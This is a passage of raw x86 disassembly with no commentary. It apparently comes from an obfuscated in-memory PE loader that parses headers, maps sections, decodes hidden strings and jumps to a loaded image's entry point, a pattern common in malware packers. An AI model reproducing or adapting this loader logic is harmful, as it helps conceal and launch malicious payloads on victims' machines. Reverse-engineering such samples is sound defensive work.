  4185bc:	mov    DWORD PTR [ebp-0x2c],0xf88c8585
  4185c3:	mov    eax,DWORD PTR [ebp-0x2c]
  4185c6:	xor    eax,esi
  4185c8:	add    eax,edi
  4185ca:	mov    DWORD PTR [ebp-0x2c],eax
  4185cd:	mov    eax,DWORD PTR [ebp-0x4]
  4185d0:	mov    eax,DWORD PTR [ebx+0x190]
  4185d6:	mov    ecx,DWORD PTR [eax]
  4185d8:	mov    ecx,DWORD PTR [ecx+0x3c]
  4185db:	add    ecx,DWORD PTR [eax]
  4185dd:	mov    eax,DWORD PTR [ebp-0x4]
  4185e0:	mov    eax,DWORD PTR [ebx+0x18c]
  4185e6:	mov    edx,DWORD PTR [eax]
  4185e8:	mov    DWORD PTR [ebp-0x18],ecx
  4185eb:	mov    DWORD PTR [ebp+0x20],edx
  4185ee:	cmp    edx,edx
  4185f0:	jne    0x418624
  4185f2:	mov    eax,DWORD PTR [ebx+0x1d8]
  4185f8:	lea    edx,[ebp-0x1c]
  4185fb:	push   edx
  4185fc:	mov    edx,DWORD PTR [ebp-0xc]
  4185ff:	xor    edx,esi
  418601:	add    edx,edi
  418603:	push   edx
  418604:	push   DWORD PTR [ecx+0x50]
  418607:	push   DWORD PTR [ebp+0x20]
  41860a:	call   DWORD PTR [eax+0x1c]
  41860d:	mov    eax,DWORD PTR [ebp-0x18]
  418610:	mov    ecx,DWORD PTR [eax+0x54]
  418613:	mov    eax,DWORD PTR [eax+0x50]
  418616:	sub    eax,ecx
  418618:	add    ecx,DWORD PTR [ebp+0x20]
  41861b:	push   ecx
  41861c:	call   0x418fa3
  418621:	mov    edx,DWORD PTR [ebp+0x20]
  418624:	mov    eax,DWORD PTR [ebx+0x194]
  41862a:	mov    DWORD PTR [eax],edx
  41862c:	mov    eax,DWORD PTR [ebp+0xc]
  41862f:	push   DWORD PTR [eax+0x54]
  418632:	push   DWORD PTR [ebp+0x8]
  418635:	push   edx
  418636:	call   0x418e4a
  41863b:	mov    ecx,DWORD PTR [ebp+0x20]
  41863e:	mov    eax,DWORD PTR [ecx+0x3c]
  418641:	add    eax,ecx
  418643:	movzx  ecx,WORD PTR [eax+0x14]
  418647:	lea    ecx,[ecx+eax*1+0x18]
  41864b:	mov    DWORD PTR [ebp+0x18],ecx
  41864e:	mov    ecx,DWORD PTR [ebp-0x4]
  418651:	movzx  edx,WORD PTR [eax+0x6]
  418655:	xor    ecx,esi
  418657:	add    ecx,edi
  418659:	mov    DWORD PTR [ebp+0xc],eax
  41865c:	cmp    edx,ecx
  41865e:	je     0x41870b
  418664:	mov    ecx,DWORD PTR [ebp-0x4]
  418667:	xor    ecx,esi
  418669:	add    ecx,edi
  41866b:	mov    DWORD PTR [ebp-0x8],ecx
  41866e:	mov    ecx,DWORD PTR [ebp-0x24]
  418671:	movzx  edx,WORD PTR [eax+0x6]
  418675:	xor    ecx,esi
  418677:	sub    edx,ecx
  418679:	sub    edx,edi
  41867b:	cmp    DWORD PTR [ebp-0x8],edx
  41867e:	ja     0x41870b
  418684:	mov    edx,DWORD PTR [ebp+0x18]
  418687:	add    edx,0x8
  41868a:	mov    DWORD PTR [ebp+0x18],edx
  41868d:	jmp    0x418692
  41868f:	mov    edx,DWORD PTR [ebp+0x18]
  418692:	mov    eax,DWORD PTR [eax+0x38]
  418695:	lea    ecx,[eax-0x1]
  418698:	mov    DWORD PTR [ebp-0x34],eax
  41869b:	mov    eax,DWORD PTR [edx]
  41869d:	test   ecx,eax
  41869f:	je     0x4186a8
  4186a1:	not    ecx
  4186a3:	and    eax,ecx
  4186a5:	add    eax,DWORD PTR [ebp-0x34]
  4186a8:	mov    ecx,DWORD PTR [edx+0x4]
  4186ab:	add    ecx,DWORD PTR [ebp+0x20]
  4186ae:	push   ecx
  4186af:	call   0x418fa3
  4186b4:	mov    edx,DWORD PTR [ebp-0x4]
  4186b7:	mov    eax,DWORD PTR [ebp+0x18]
  4186ba:	mov    ecx,DWORD PTR [eax+0x8]
  4186bd:	xor    edx,esi
  4186bf:	add    edx,edi
  4186c1:	cmp    ecx,edx
  4186c3:	je     0x4186dc
  4186c5:	push   ecx
  4186c6:	mov    ecx,DWORD PTR [ebp+0x8]
  4186c9:	add    ecx,DWORD PTR [eax+0xc]
  4186cc:	mov    eax,DWORD PTR [eax+0x4]
  4186cf:	add    eax,DWORD PTR [ebp+0x20]
  4186d2:	push   ecx
  4186d3:	push   eax
  4186d4:	call   0x418e4a
  4186d9:	mov    eax,DWORD PTR [ebp+0x18]
  4186dc:	mov    ecx,DWORD PTR [ebp-0x24]
  4186df:	mov    edx,DWORD PTR [ebp-0x8]
  4186e2:	add    eax,0x28
  4186e5:	xor    ecx,esi
  4186e7:	lea    ecx,[edx+ecx*1+0x3272e2]
  4186ee:	mov    edx,DWORD PTR [ebp+0xc]
  4186f1:	mov    DWORD PTR [ebp+0x18],eax
  4186f4:	mov    eax,DWORD PTR [ebp-0x24]
  4186f7:	movzx  edx,WORD PTR [edx+0x6]
  4186fb:	xor    eax,esi
  4186fd:	sub    edx,eax
  4186ff:	mov    eax,DWORD PTR [ebp+0xc]
  418702:	sub    edx,edi
  418704:	mov    DWORD PTR [ebp-0x8],ecx
  418707:	cmp    ecx,edx
  418709:	jbe    0x41868f
  41870b:	mov    edx,DWORD PTR [ebx+0x18c]
  418711:	mov    ecx,DWORD PTR [ebp+0x20]
  418714:	cmp    ecx,DWORD PTR [edx]
  418716:	jne    0x41873f
  418718:	mov    eax,DWORD PTR [ebx+0x1d8]
  41871e:	lea    edx,[ebp-0x1c]
  418721:	push   edx
  418722:	mov    edx,DWORD PTR [ebp-0x10]
  418725:	xor    edx,esi
  418727:	add    edx,edi
  418729:	push   edx
  41872a:	mov    edx,DWORD PTR [ebp-0x18]
  41872d:	push   DWORD PTR [edx+0x54]
  418730:	push   ecx
  418731:	call   DWORD PTR [eax+0x1c]
  418734:	test   eax,eax
  418736:	je     0x4189a8
  41873c:	mov    eax,DWORD PTR [ebp+0xc]
  41873f:	mov    ecx,DWORD PTR [ebx+0x1c8]
  418745:	mov    ecx,DWORD PTR [ecx]
  418747:	xor    ecx,esi
  418749:	add    ecx,edi
  41874b:	je     0x4188d3
  418751:	and    DWORD PTR [ebp-0x28],0x0
  418755:	and    DWORD PTR [ebp+0x8],0x0
  418759:	mov    eax,0xf89c8519
  41875e:	lea    ecx,[eax-0x8]
  418761:	mov    DWORD PTR [ebp-0x4c],0xf89c8517
  418768:	mov    DWORD PTR [ebp-0x48],0xf89c8509
  41876f:	mov    DWORD PTR [ebp-0x44],eax
  418772:	mov    DWORD PTR [ebp-0x40],ecx
  418775:	mov    DWORD PTR [ebp-0x3c],ecx
  418778:	mov    DWORD PTR [ebp-0x38],0xf89c8585
  41877f:	mov    edx,DWORD PTR [ebp+0x8]
  418782:	mov    ecx,0x89b
  418787:	xor    cx,WORD PTR [ebp+edx*4-0x4c]
  41878c:	mov    edx,0x72e2
  418791:	add    cx,dx
  418794:	mov    edx,DWORD PTR [ebp+0x8]
  418797:	inc    DWORD PTR [ebp+0x8]
  41879a:	cmp    DWORD PTR [ebp+0x8],0x6
  41879e:	mov    WORD PTR [ebp+edx*2-0xb4],cx
  4187a6:	jb     0x41877f
  4187a8:	mov    ecx,0xf89c850b
  4187ad:	mov    DWORD PTR [ebp-0xa4],eax
  4187b3:	mov    DWORD PTR [ebp-0x90],eax
  4187b9:	mov    DWORD PTR [ebp-0x68],eax
  4187bc:	mov    DWORD PTR [ebp-0x64],eax
  4187bf:	lea    eax,[ecx-0x1]
  4187c2:	mov    edx,0xf89c85ff
  4187c7:	mov    DWORD PTR [ebp-0x58],eax
  4187ca:	mov    DWORD PTR [ebp-0x54],eax
  4187cd:	mov    DWORD PTR [ebp-0xa8],0xf89c85f1
  4187d7:	mov    DWORD PTR [ebp-0xa0],ecx
  4187dd:	mov    DWORD PTR [ebp-0x9c],edx
  4187e3:	mov    DWORD PTR [ebp-0x98],0xf89c851c
  4187ed:	mov    DWORD PTR [ebp-0x94],0xf89c8517
  4187f7:	mov    DWORD PTR [ebp-0x8c],0xf89c85f8
  418801:	mov    DWORD PTR [ebp-0x88],0xf89c8517
  41880b:	mov    DWORD PTR [ebp-0x84],0xf89c8509
  418815:	mov    DWORD PTR [ebp-0x80],ecx
  418818:	mov    DWORD PTR [ebp-0x7c],0xf89c850c
  41881f:	mov    DWORD PTR [ebp-0x78],edx
  418822:	mov    DWORD PTR [ebp-0x74],0xf89c8516
  418829:	mov    DWORD PTR [ebp-0x70],ecx
  41882c:	mov    DWORD PTR [ebp-0x6c],0xf89c85c4
  418833:	mov    DWORD PTR [ebp-0x60],ecx
  418836:	mov    DWORD PTR [ebp-0x5c],0xf89c8518
  41883d:	mov    DWORD PTR [ebp-0x50],0xf89c8585
  418844:	xor    eax,eax
  418846:	mov    cl,BYTE PTR [ebp+eax*4-0xa8]
  41884d:	xor    cl,0x9b
  418850:	sub    cl,0x1e
  418853:	mov    BYTE PTR [ebp+eax*1-0xcc],cl
  41885a:	inc    eax
  41885b:	cmp    eax,0x17
  41885e:	jb     0x418846
  418860:	mov    eax,DWORD PTR [ebx+0x1d8]
  418866:	lea    ecx,[ebp-0xb4]
  41886c:	push   ecx
  41886d:	call   DWORD PTR [eax+0x4]
  418870:	mov    ecx,DWORD PTR [ebx+0x1d8]
  418876:	lea    edx,[ebp-0xcc]
  41887c:	push   edx
  41887d:	push   eax
  41887e:	call   DWORD PTR [ecx+0x8]
  418881:	lea    ecx,[ebp-0x28]
  418884:	push   ecx
  418885:	mov    ecx,DWORD PTR [ebx+0x18c]
  41888b:	push   DWORD PTR [ecx]
  41888d:	call   eax
  41888f:	mov    eax,DWORD PTR [ebp-0x28]
  418892:	test   eax,eax
  418894:	je     0x4188d0
  418896:	mov    DWORD PTR [ebp+0x8],eax
  418899:	jmp    0x4188a5
  41889b:	mov    eax,DWORD PTR [eax]
  41889d:	mov    DWORD PTR [ebp-0x28],eax
  4188a0:	cmp    eax,DWORD PTR [ebp+0x8]
  4188a3:	je     0x4188b2
  4188a5:	mov    edx,DWORD PTR [eax+0x18]
  4188a8:	mov    ecx,DWORD PTR [ebx+0x18c]
  4188ae:	cmp    edx,DWORD PTR [ecx]
  4188b0:	jne    0x41889b
  4188b2:	mov    edx,DWORD PTR [eax+0x18]
  4188b5:	mov    ecx,DWORD PTR [ebx+0x18c]
  4188bb:	cmp    edx,DWORD PTR [ecx]
  4188bd:	jne    0x4188d0
  4188bf:	mov    edx,DWORD PTR [ebp-0x18]
  4188c2:	mov    ecx,DWORD PTR [ebx+0x190]
  4188c8:	mov    edx,DWORD PTR [edx+0x28]
  4188cb:	add    edx,DWORD PTR [ecx]
  4188cd:	mov    DWORD PTR [eax+0x1c],edx
  4188d0:	mov    eax,DWORD PTR [ebp+0xc]
  4188d3:	push   ebx
  4188d4:	push   eax
  4188d5:	push   DWORD PTR [ebp+0x20]
  4188d8:	call   0x418082
  4188dd:	test   eax,eax
  4188df:	je     0x4189a8
  4188e5:	push   DWORD PTR [ebp+0xc]
  4188e8:	mov    ecx,ebx
  4188ea:	push   DWORD PTR [ebp+0x20]
  4188ed:	call   0x417fdb
  4188f2:	test   eax,eax
  4188f4:	je     0x4189a8
  4188fa:	mov    eax,DWORD PTR [ebp+0xc]
  4188fd:	mov    edx,DWORD PTR [ebp+0x20]
  418900:	mov    ecx,ebx
  418902:	call   0x417eb4
  418907:	test   eax,eax
  418909:	je     0x4189a8
  41890f:	push   ebx
  418910:	push   DWORD PTR [ebp+0x20]
  418913:	call   0x418365
  418918:	test   eax,eax
  41891a:	je     0x4189a8
  418920:	mov    eax,DWORD PTR [ebx+0x18c]
  418926:	mov    edx,DWORD PTR [ebp+0x20]
  418929:	cmp    edx,DWORD PTR [eax]
  41892b:	jne    0x418947
  41892d:	mov    eax,DWORD PTR [ebx+0x1d8]
  418933:	lea    ecx,[ebp-0x1c]
  418936:	push   ecx
  418937:	push   DWORD PTR [ebp-0x1c]
  41893a:	mov    ecx,DWORD PTR [ebp-0x18]
  41893d:	push   DWORD PTR [ecx+0x54]
  418940:	push   edx
  418941:	call   DWORD PTR [eax+0x1c]
  418944:	mov    edx,DWORD PTR [ebp+0x20]
  418947:	mov    eax,DWORD PTR [ebx+0x1c8]
  41894d:	mov    eax,DWORD PTR [eax]
  41894f:	xor    eax,esi
  418951:	add    eax,edi
  418953:	je     0x41898c
  418955:	mov    ecx,DWORD PTR [ebp+0xc]
  418958:	mov    eax,DWORD PTR [ecx+0x28]
  41895b:	mov    DWORD PTR [ebp+0x8],0xf89ca585
  418962:	mov    esi,DWORD PTR [ebp+0x8]
  418965:	push   DWORD PTR [ebp+0x14]
  418968:	xor    esi,0x89b
  41896e:	push   DWORD PTR [ebp+0x10]
  418971:	add    esi,0x72e2
  418977:	or     WORD PTR [ecx+0x16],si
  41897b:	add    eax,edx
  41897d:	push   edx
  41897e:	call   eax
  418980:	mov    DWORD PTR [ebx+0x1d0],0xf89c8584
  41898a:	jmp    0x418996
  41898c:	mov    eax,DWORD PTR [ebp+0xc]
  41898f:	mov    eax,DWORD PTR [eax+0x28]
  418992:	add    eax,edx
  418994:	call   eax
  418996:	mov    DWORD PTR [ebp-0x8],eax
  418999:	mov    eax,DWORD PTR [ebp-0x8]
  41899c:	mov    ecx,DWORD PTR [ebp+0x1c]
  41899f:	mov    DWORD PTR [ecx],eax
  4189a1:	mov    DWORD PTR [ebp-0x30],0x1
  4189a8:	cmp    DWORD PTR [ebp-0x30],0x0
  4189ac:	jne    0x4189b2
  4189ae:	and    DWORD PTR [ebp+0x20],0x0
  4189b2:	mov    eax,DWORD PTR [ebp+0x20]
  4189b5:	jmp    0x4189b9
  4189b7:	xor    eax,eax
  4189b9:	pop    edi
  4189ba:	pop    esi
  4189bb:	pop    ebx
  4189bc:	leave  
  4189bd:	ret    0x1c
  4189c0:	push   ebp
  4189c1:	mov    ebp,esp
  4189c3:	movzx  edx,WORD PTR [ecx+0x6]
  4189c7:	movzx  eax,WORD PTR [ecx+0x14]
  4189cb:	push   ebx
  4189cc:	push   edi
  4189cd:	xor    edi,edi
  4189cf:	lea    eax,[eax+ecx*1+0x18]
  4189d3:	test   edx,edx
  4189d5:	je     0x4189f6
  4189d7:	mov    ecx,DWORD PTR [eax+0xc]
  4189da:	lea    ebx,[ecx+esi*1]
  4189dd:	cmp    DWORD PTR [ebp+0x8],ebx
  4189e0:	jb     0x4189ee
  4189e2:	mov    ebx,DWORD PTR [eax+0x8]
  4189e5:	add    ebx,ecx
  4189e7:	add    ebx,esi
  4189e9:	cmp    DWORD PTR [ebp+0x8],ebx
  4189ec:	jb     0x4189f8
  4189ee:	add    eax,0x28
  4189f1:	inc    edi
  4189f2:	cmp    edi,edx
  4189f4:	jb     0x4189d7
  4189f6:	xor    eax,eax
  4189f8:	pop    edi
  4189f9:	pop    ebx
  4189fa:	pop    ebp
  4189fb:	ret    0x4
  4189fe:	push   ebp
  4189ff:	mov    ebp,esp
  418a01:	sub    esp,0x34
  418a04:	mov    DWORD PTR [ebp-0xc],0xf89c8585
  418a0b:	mov    DWORD PTR [ebp-0x18],0xf89c8584
  418a12:	mov    DWORD PTR [ebp-0x1c],0xf89c85bb
  418a19:	mov    DWORD PTR [ebp-0x8],0xf89c85e4
  418a20:	mov    DWORD PTR [ebp-0x20],0xf89c85c4
  418a27:	mov    DWORD PTR [ebp-0x2c],0xf89c8503
  418a2e:	mov    DWORD PTR [ebp-0x2c],0xf89c85e3
  418a35:	mov    DWORD PTR [ebp-0x10],eax
  418a38:	mov    eax,DWORD PTR [ebp+0x8]
  418a3b:	mov    DWORD PTR [ebp-0x14],eax
  418a3e:	mov    eax,DWORD PTR [ebp-0xc]
  418a41:	push   ebx
  418a42:	mov    ecx,0x751089b
  418a47:	xor    eax,ecx
  418a49:	push   esi
  418a4a:	mov    esi,DWORD PTR [ebp-0x10]
  418a4d:	mov    edx,0x3272e2
  418a52:	add    eax,edx
  418a54:	push   edi
  418a55:	cmp    esi,eax
  418a57:	je     0x418c36
  418a5d:	mov    eax,DWORD PTR [ebp-0xc]
  418a60:	mov    esi,DWORD PTR [ebp-0x14]
  418a63:	xor    eax,ecx
  418a65:	add    eax,edx
  418a67:	cmp    esi,eax
  418a69:	je     0x418c36
  418a6f:	mov    eax,DWORD PTR [ebp-0xc]
  418a72:	xor    eax,ecx
  418a74:	add    eax,edx
  418a76:	mov    DWORD PTR [ebp-0x24],eax
  418a79:	mov    eax,DWORD PTR [ebp-0xc]
  418a7c:	xor    eax,ecx
  418a7e:	add    eax,edx
  418a80:	mov    DWORD PTR [ebp-0x28],eax
  418a83:	mov    edi,DWORD PTR [ebp-0x20]
  418a86:	mov    ebx,DWORD PTR [ebp-0x8]
  418a89:	mov    esi,0x89b
  418a8e:	xor    edi,esi
  418a90:	mov    eax,0x72e2
  418a95:	xor    ebx,esi
  418a97:	add    edi,eax
  418a99:	add    ebx,eax
  418a9b:	sub    ebx,edi
  418a9d:	mov    WORD PTR [ebp-0x8],bx
  418aa1:	jmp    0x418b66
  418aa6:	mov    edi,DWORD PTR [ebp-0xc]
  418aa9:	mov    bx,WORD PTR [ebp-0x4]
  418aad:	xor    edi,esi
  418aaf:	add    edi,eax
  418ab1:	cmp    bx,di
  418ab4:	je     0x418ba8
  418aba:	mov    edi,DWORD PTR [ebp-0xc]
  418abd:	mov    ebx,DWORD PTR [ebp+0xc]
  418ac0:	xor    edi,ecx
  418ac2:	add    edi,edx
  418ac4:	cmp    ebx,edi
  418ac6:	mov    di,WORD PTR [ebp-0x4]
  418aca:	mov    bx,WORD PTR [ebp+0x8]
  418ace:	je     0x418b39
  418ad0:	cmp    bx,di
  418ad3:	je     0x418b42
  418ad5:	mov    edi,DWORD PTR [ebp-0x20]
  418ad8:	mov    bx,WORD PTR [ebp+0x8]
  418adc:	xor    edi,esi
  418ade:	add    edi,eax
  418ae0:	cmp    bx,di
  418ae3:	jb     0x418b03
  418ae5:	mov    edi,DWORD PTR [ebp-0x2c]
  418ae8:	mov    bx,WORD PTR [ebp+0x8]
  418aec:	xor    edi,esi
  418aee:	add    edi,eax
  418af0:	cmp    bx,di
  418af3:	ja     0x418b03
  418af5:	movzx  edi,WORD PTR [ebp+0x8]
  418af9:	movzx  ebx,WORD PTR [ebp-0x8]
  418afd:	add    edi,ebx
  418aff:	mov    WORD PTR [ebp+0x8],di
  418b03:	mov    edi,DWORD PTR [ebp-0x20]
  418b06:	mov    bx,WORD PTR [ebp-0x4]
  418b0a:	xor    edi,esi
  418b0c:	add    edi,eax
  418b0e:	cmp    bx,di
  418b11:	jb     0x418b31
  418b13:	mov    edi,DWORD PTR [ebp-0x2c]
  418b16:	mov    bx,WORD PTR [ebp-0x4]
  418b1a:	xor    edi,esi
  418b1c:	add    edi,eax
  418b1e:	cmp    bx,di
  418b21:	ja     0x418b31
  418b23:	movzx  edi,WORD PTR [ebp-0x4]
  418b27:	movzx  ebx,WORD PTR [ebp-0x8]
  418b2b:	add    edi,ebx
  418b2d:	mov    WORD PTR [ebp-0x4],di
  418b31:	mov    di,WORD PTR [ebp-0x4]
  418b35:	mov    bx,WORD PTR [ebp+0x8]
  418b39:	cmp    bx,di
  418b3c:	jne    0x418c36
  418b42:	mov    edi,DWORD PTR [ebp-0x1c]
  418b45:	mov    ebx,DWORD PTR [ebp-0x10]
  418b48:	xor    edi,ecx
  418b4a:	lea    edi,[edi+ebx*1+0x3272e2]
  418b51:	mov    DWORD PTR [ebp-0x10],edi
  418b54:	mov    edi,DWORD PTR [ebp-0x1c]
  418b57:	mov    ebx,DWORD PTR [ebp-0x14]
  418b5a:	xor    edi,ecx
  418b5c:	lea    edi,[edi+ebx*1+0x3272e2]
  418b63:	mov    DWORD PTR [ebp-0x14],edi
  418b66:	mov    edi,DWORD PTR [ebp-0x24]
  418b69:	mov    ebx,DWORD PTR [ebp-0x10]
  418b6c:	mov    di,WORD PTR [ebx+edi*2]
  418b70:	mov    WORD PTR [ebp+0x8],di
  418b74:	mov    edi,DWORD PTR [ebp-0x28]
  418b77:	mov    ebx,DWORD PTR [ebp-0x14]
  418b7a:	mov    di,WORD PTR [ebx+edi*2]
  418b7e:	mov    WORD PTR [ebp-0x4],di
  418b82:	mov    edi,DWORD PTR [ebp-0xc]
  418b85:	mov    bx,WORD PTR [ebp+0x8]
  418b89:	xor    edi,esi
  418b8b:	add    edi,eax
  418b8d:	cmp    bx,di
  418b90:	jne    0x418aa6
  418b96:	mov    eax,DWORD PTR [ebp-0x18]
  418b99:	mov    esi,DWORD PTR [ebp-0xc]
  418b9c:	xor    eax,ecx
  418b9e:	add    eax,edx
  418ba0:	imul   eax,esi
  418ba3:	mov    DWORD PTR [ebp-0xc],eax
  418ba6:	jmp    0x418bba
  418ba8:	mov    eax,DWORD PTR [ebp-0xc]
  418bab:	mov    esi,DWORD PTR [ebp-0x18]
  418bae:	xor    eax,ecx
  418bb0:	lea    eax,[eax+esi*1+0x3272e2]
  418bb7:	mov    DWORD PTR [ebp-0x18],eax
  418bba:	mov    eax,DWORD PTR [ebp-0x24]
  418bbd:	sub    eax,edx
  418bbf:	xor    eax,ecx
  418bc1:	mov    DWORD PTR [ebp-0x30],eax
  418bc4:	mov    eax,DWORD PTR [ebp-0x28]
  418bc7:	sub    eax,edx
  418bc9:	xor    eax,ecx
  418bcb:	mov    DWORD PTR [ebp-0x34],eax
  418bce:	mov    eax,DWORD PTR [ebp-0x34]
  418bd1:	mov    esi,DWORD PTR [ebp-0x1c]
  418bd4:	xor    esi,ecx
  418bd6:	add    esi,edx
  418bd8:	xor    eax,ecx
  418bda:	add    eax,0x3272e2
  418bdf:	imul   esi,eax
  418be2:	mov    eax,DWORD PTR [ebp-0x14]
  418be5:	movzx  eax,WORD PTR [esi+eax*1]
  418be9:	mov    esi,DWORD PTR [ebp-0x30]
  418bec:	mov    edi,DWORD PTR [ebp-0x1c]
  418bef:	xor    esi,ecx
  418bf1:	add    esi,edx
  418bf3:	xor    edi,ecx
  418bf5:	add    edi,edx
  418bf7:	imul   edi,esi
  418bfa:	mov    esi,DWORD PTR [ebp-0x10]
  418bfd:	movzx  esi,WORD PTR [edi+esi*1]
  418c01:	sub    eax,edx
  418c03:	sub    esi,edx
  418c05:	xor    eax,ecx
  418c07:	xor    esi,ecx
  418c09:	cmp    esi,eax
  418c0b:	jne    0x418c36
  418c0d:	mov    eax,DWORD PTR [ebp-0x30]
  418c10:	mov    esi,DWORD PTR [ebp-0x1c]
  418c13:	xor    eax,ecx
  418c15:	add    eax,0x3272e2
  418c1a:	xor    esi,ecx
  418c1c:	add    esi,edx
  418c1e:	imul   esi,eax
  418c21:	mov    eax,DWORD PTR [ebp-0x10]
  418c24:	movzx  eax,WORD PTR [esi+eax*1]
  418c28:	mov    esi,DWORD PTR [ebp-0xc]
  418c2b:	sub    eax,edx
  418c2d:	xor    eax,ecx
  418c2f:	cmp    eax,esi
  418c31:	mov    eax,DWORD PTR [ebp-0xc]
  418c34:	je     0x418c39
  418c36:	mov    eax,DWORD PTR [ebp-0x18]
  418c39:	pop    edi
  418c3a:	xor    eax,ecx
  418c3c:	pop    esi
  418c3d:	add    eax,edx
  418c3f:	pop    ebx
  418c40:	leave  
  418c41:	ret    0x8
  418c44:	push   ebp
  418c45:	mov    ebp,esp
  418c47:	push   ecx
  418c48:	mov    cx,WORD PTR [eax]
  418c4b:	push   esi
  418c4c:	mov    esi,0x3b51
  418c51:	sub    cx,si
  418c54:	mov    esi,0x8a8d
  418c59:	xor    cx,si
  418c5c:	mov    esi,0x4e22
  418c61:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418c68:	mov    edx,0xf89c8585
  418c6d:	cmp    cx,si
  418c70:	je     0x418ccf
  418c72:	push   ebx
  418c73:	push   edi
  418c74:	movzx  ecx,cx
  418c77:	mov    edi,0xffcd8d1e
  418c7c:	mov    esi,0x751089b
  418c81:	mov    ebx,0x4f86
  418c86:	cmp    cx,bx
  418c89:	jne    0x418c8e
  418c8b:	mov    DWORD PTR [ebp-0x4],edx
  418c8e:	lea    edx,[edi+0x1]
  418c91:	xor    edx,esi
  418c93:	mov    edi,edx
  418c95:	xor    edi,esi
  418c97:	mov    cx,WORD PTR [eax+edi*2+0x64e5c4]
  418c9f:	mov    ebx,0x3b51
  418ca4:	sub    cx,bx
  418ca7:	mov    ebx,0x8a8d
  418cac:	xor    cx,bx
  418caf:	mov    ebx,0x4e22
  418cb4:	cmp    cx,bx
  418cb7:	jne    0x418c81
  418cb9:	mov    ecx,DWORD PTR [ebp-0x4]
  418cbc:	pop    edi
  418cbd:	pop    ebx
  418cbe:	cmp    ecx,0xf89c8586
  418cc4:	je     0x418ccf
  418cc6:	xor    ecx,esi
  418cc8:	lea    eax,[eax+ecx*2+0x64e5c6]
  418ccf:	pop    esi
  418cd0:	leave  
  418cd1:	ret    
  418cd2:	push   ebp
  418cd3:	mov    ebp,esp
  418cd5:	push   ecx
  418cd6:	push   esi
  418cd7:	push   edi
  418cd8:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418cdf:	mov    esi,0xf89c8585
  418ce4:	call   0x418c44
  418ce9:	mov    edi,eax
  418ceb:	mov    al,BYTE PTR [edi]
  418ced:	add    al,0x8
  418cef:	xor    al,0x74
  418cf1:	cmp    al,0x7c
  418cf3:	je     0x418d56
  418cf5:	mov    eax,edi
  418cf7:	mov    edx,0xffcd8d1e
  418cfc:	mov    ecx,0x751089b
  418d01:	push   ebx
  418d02:	mov    ax,WORD PTR [eax]
  418d05:	mov    ebx,0x3b51
  418d0a:	sub    ax,bx
  418d0d:	mov    ebx,0x8a8d
  418d12:	xor    ax,bx
  418d15:	mov    ebx,0x4e50
  418d1a:	cmp    ax,bx
  418d1d:	jne    0x418d22
  418d1f:	mov    DWORD PTR [ebp-0x4],esi
  418d22:	lea    esi,[edx+0x1]
  418d25:	xor    esi,ecx
  418d27:	mov    edx,esi
  418d29:	xor    edx,ecx
  418d2b:	lea    eax,[edi+edx*2+0x64e5c4]
  418d32:	mov    bl,BYTE PTR [eax]
  418d34:	add    bl,0x8
  418d37:	xor    bl,0x74
  418d3a:	cmp    bl,0x7c
  418d3d:	jne    0x418d02
  418d3f:	mov    eax,DWORD PTR [ebp-0x4]
  418d42:	pop    ebx
  418d43:	cmp    eax,0xf89c8586
  418d48:	je     0x418d56
  418d4a:	xor    eax,ecx
  418d4c:	xor    ecx,ecx
  418d4e:	mov    WORD PTR [edi+eax*2+0x64e5c4],cx
  418d56:	mov    eax,edi
  418d58:	pop    edi
  418d59:	pop    esi
  418d5a:	leave  
  418d5b:	ret    
  418d5c:	push   ebp
  418d5d:	mov    ebp,esp
  418d5f:	push   ecx
  418d60:	push   esi
  418d61:	mov    DWORD PTR [ebp-0x4],0xf89c8586
  418d68:	mov    esi,0xf89c8585
  418d6d:	call   0x418c44
  418d72:	mov    cx,WORD PTR [eax]
  418d75:	mov    edx,0x3b51
  418d7a:	sub    cx,dx
  418d7d:	mov    edx,0x8a8d
  418d82:	xor    cx,dx
  418d85:	mov    edx,0x4e22
  418d8a:	cmp    cx,dx
  418d8d:	je     0x418de6
  418d8f:	push   ebx
  418d90:	push   edi
  418d91:	movzx  ecx,cx
  418d94:	mov    edx,0xffcd8d1e
  418d99:	mov    edi,0x751089b
  418d9e:	mov    ebx,0x4e50
  418da3:	cmp    cx,bx
  418da6:	jne    0x418dab
  418da8:	mov    DWORD PTR [ebp-0x4],esi
  418dab:	lea    esi,[edx+0x1]
  418dae:	xor    esi,edi
  418db0:	mov    edx,esi
  418db2:	xor    edx,edi
  418db4:	mov    cx,WORD PTR [eax+edx*2+0x64e5c4]
  418dbc:	mov    ebx,0x3b51
  418dc1:	sub    cx,bx
  418dc4:	mov    ebx,0x8a8d
  418dc9:	xor    cx,bx
  418dcc:	mov    ebx,0x4e22
  418dd1:	cmp    cx,bx
  418dd4:	jne    0x418d9e
  418dd6:	cmp    DWORD PTR [ebp-0x4],0xf89c8586
  418ddd:	pop    edi
  418dde:	pop    ebx
  418ddf:	je     0x418de6
  418de1:	xor    eax,eax
  418de3:	inc    eax
  418de4:	jmp    0x418de8
  418de6:	xor    eax,eax
  418de8:	pop    esi
  418de9:	leave  
  418dea:	ret    
  418deb:	push   ebp
  418dec:	mov    ebp,esp
  418dee:	push   ecx
  418def:	mov    eax,DWORD PTR [ebp+0x8]
  418df2:	movzx  ecx,WORD PTR [eax]
  418df5:	push   esi
  418df6:	lea    eax,[ecx-0x3b51]
  418dfc:	mov    esi,0x8a8d
  418e01:	push   edi
  418e02:	xor    eax,esi
  418e04:	mov    edi,0x4e22
  418e09:	mov    DWORD PTR [ebp-0x4],edx
  418e0c:	cmp    ax,di
  418e0f:	je     0x418e3c
  418e11:	mov    eax,DWORD PTR [ebp+0x8]
  418e14:	sub    eax,edx
  418e16:	mov    DWORD PTR [ebp+0x8],eax
  418e19:	jmp    0x418e1e
  418e1b:	mov    eax,DWORD PTR [ebp+0x8]
  418e1e:	mov    WORD PTR [edx],cx
  418e21:	add    edx,0x2
  418e24:	movzx  edi,WORD PTR [eax+edx*1]
  418e28:	mov    ecx,edi
  418e2a:	add    edi,0xffffc4af
  418e30:	xor    edi,esi
  418e32:	mov    eax,0x4e22
  418e37:	cmp    di,ax
  418e3a:	jne    0x418e1b
  418e3c:	xor    eax,eax
  418e3e:	pop    edi
  418e3f:	mov    WORD PTR [edx],ax
  418e42:	mov    eax,DWORD PTR [ebp-0x4]
  418e45:	pop    esi
  418e46:	leave  
  418e47:	ret    0x4
  418e4a:	push   ebp
  418e4b:	mov    ebp,esp
  418e4d:	sub    esp,0x18
  418e50:	mov    DWORD PTR [ebp-0x14],0xf89c8585
